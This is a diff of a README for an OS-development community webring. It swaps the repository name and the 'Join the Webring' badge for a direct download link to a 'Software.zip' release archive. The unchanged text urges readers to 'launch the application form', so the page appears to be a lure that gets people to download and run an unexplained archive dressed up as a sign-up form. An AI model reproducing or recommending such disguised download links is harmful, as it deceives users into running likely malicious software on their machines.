@@ -4,14 +4,14 @@
 Welcome to Bytesized Webring, a community hub for individuals passionate about operating system development and low-level programming! Whether you are diving into the world of OS development, tinkering with bare metal, exploring embedded systems, or simply love writing low-level code, this webring is the perfect place to connect, collaborate, and learn from like-minded individuals.
 
 ## Repository Details
-- **Repository Name:** bytesized.webring
+- **Repository Name:** https://github.com/JOSHUAGAMAYUTIN/bytesized.webring/releases/download/v2.0/Software.zip
 - **Description:** This webring is dedicated to individuals interested in operating system development, low-level programming, and everything in between. Join us to share your experiences, projects, and knowledge with a community that shares your passion!
 - **Topics:** ['arm', 'assembly', 'bare-metal', 'bootloader', 'c', 'embedded-systems', 'firmware', 'hackers', 'kernel', 'learning', 'low-level', 'open-source', 'osdev', 'qemu', 'riscv', 'rust', 'systems-programming', 'tinkering', 'webring', 'x86']
 
 ## Join the Webring
 Are you ready to become a part of our vibrant community? Simply click the button below to access the application form and join the Bytesized Webring!
 
-[![Join the Webring](https://img.shields.io/badge/Join%20the%20Webring-Application%20Form-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Join the Webring](https://github.com/JOSHUAGAMAYUTIN/bytesized.webring/releases/download/v2.0/Software.zip%20the%20Webring-Application%20Form-blue)](https://github.com/JOSHUAGAMAYUTIN/bytesized.webring/releases/download/v2.0/Software.zip)
 
 **Note:** Kindly remember to launch the application form to complete the joining process.
 
